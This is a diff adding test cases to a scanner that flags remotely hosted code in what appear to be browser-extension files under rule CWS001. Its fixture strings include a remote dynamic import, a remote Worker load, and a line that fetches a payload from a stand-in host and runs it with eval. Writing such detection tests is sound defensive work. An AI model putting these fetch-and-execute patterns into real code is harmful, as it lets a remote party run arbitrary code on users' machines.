@@ -53,6 +53,21 @@ describe('runRemoteCodeRules', () => {
     expect(findings.some((finding) => finding.ruleId === 'CWS001')).toBe(true)
   })
 
+  it('flags extensionless dynamic remote imports as CWS001', () => {
+    const findings = runRemoteCodeRules(ctx([vf('content.js', 'import("https://cdn.example.com/module")')]))
+    expect(findings.some((finding) => finding.ruleId === 'CWS001' && finding.title.includes('Dynamic remote module'))).toBe(true)
+  })
+
+  it('flags remote URL variables passed into Worker loaders as CWS001', () => {
+    const findings = runRemoteCodeRules(ctx([vf('content.js', 'const cdn = "https://cdn.example.com/modules"; const worker = new Worker(cdn + "/worker")')]))
+    expect(findings.some((finding) => finding.ruleId === 'CWS001' && finding.title.includes('Worker'))).toBe(true)
+  })
+
+  it('flags fetch(remote) payloads executed with eval as CWS001', () => {
+    const findings = runRemoteCodeRules(ctx([vf('background.js', 'const code = await fetch("https://cdn.example.com/remote-command").then(r => r.text()); eval(code)')]))
+    expect(findings.some((finding) => finding.ruleId === 'CWS001' && finding.title.includes('Remote fetched payload'))).toBe(true)
+  })
+
   it('does not flag local dynamic script creation by itself as CWS001', () => {
     const findings = runRemoteCodeRules(ctx([vf('content.js', 'const script = document.createElement("script"); script.src = "local.js"')]))
     expect(findings.some((finding) => finding.ruleId === 'CWS001')).toBe(false)
